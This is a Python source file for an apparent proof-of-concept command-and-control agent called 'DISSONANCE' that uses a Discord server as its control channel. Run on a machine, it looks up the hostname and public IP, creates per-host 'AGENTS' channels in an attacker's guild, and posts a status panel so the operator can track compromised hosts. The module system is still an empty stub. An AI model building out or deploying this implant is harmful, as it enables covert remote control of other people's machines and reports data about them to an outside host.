import os
import discord
import requests
import socket
import time

TOKEN = os.getenv("DISCORD_TOKEN")
GUILD_ID = int(os.getenv("GUILD_ID"))
HOSTNAME = socket.gethostname()

MODULES_CATEGORY_NAME = "MODULES"
MODULES_CHANNEL_NAME = "modules"
AGENTS_CATEGORY_NAME = "AGENTS"

start_time = time.time()


def public_ip():
    try:
        return requests.get(
            "https://api.ipify.org",
            timeout=5
        ).text
    except requests.RequestException:
        return "Unknown"

PUBLIC_IP = public_ip()


intents = discord.Intents.default()
intents.message_content = True

bot = discord.Client(intents=intents)

 # create the embed for the panel
def embed():
    uptime = int(time.time() - start_time)
    days, uptime = divmod(uptime, 86400)
    hours, uptime = divmod(uptime, 3600)
    minutes, seconds = divmod(uptime, 60)

    e = discord.Embed(
        title="DISSONANCE",
        description="DISSONANCE C2 POC"
    )

    for name, value in (
        ("MACHINE NAME:", HOSTNAME),
        ("PUBLIC IP:", PUBLIC_IP),
        ("UPTIME:", f"{days}d {hours}h {minutes}m {seconds}s"),
    ):
        e.add_field(
            name=name,
            value=value,
            inline=False
        )
    return e


class ModuleView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)


async def setup():
    guild = bot.get_guild(GUILD_ID)

    if not guild: # checks if guild actually exists
        print(" [!] Guild not found")
        exit()
    
    category = discord.utils.get(guild.categories, name = AGENTS_CATEGORY_NAME) 

    if not category: # checks if AGENTS category exists if it doesnt create it
        print(" [!] AGENTS Category not found")
        category = await guild.create_category(AGENTS_CATEGORY_NAME)
        print(" [+] AGENTS Category created")

    categoryModules = discord.utils.get(guild.categories, name = MODULES_CATEGORY_NAME) 

    if not categoryModules: # checks if MODULES category exists if it doesnt create it
        print(" [!] MODULES Category not found")
        categoryModules = await guild.create_category(MODULES_CATEGORY_NAME)
        print(" [+] MODULES Category created")
    
    agent_channel = discord.utils.get(guild.text_channels, name=HOSTNAME)

    if not agent_channel: # checks if this agents channel exists if not it creates the channel
        print(" [!] AGENTS Channel not found")
        agent_channel = await guild.create_text_channel( HOSTNAME, category=category)
        print(" [+] AGENTS Channel created")


    modules_channel = discord.utils.get( guild.text_channels,name=MODULES_CHANNEL_NAME)

    if not modules_channel:
        print(" [!] MODULES Channel not found")
        modules_channel = await guild.create_text_channel(MODULES_CHANNEL_NAME, category=category)
        print(" [+] MODULES Channel created")

    # create the panel for agent info a modules
    Panel = await agent_channel.send(
        embed=embed(),
        view=ModuleView()
    )



@bot.event
async def on_ready():
    print(f"Connected as {bot.user}")
    await setup()




bot.run(TOKEN)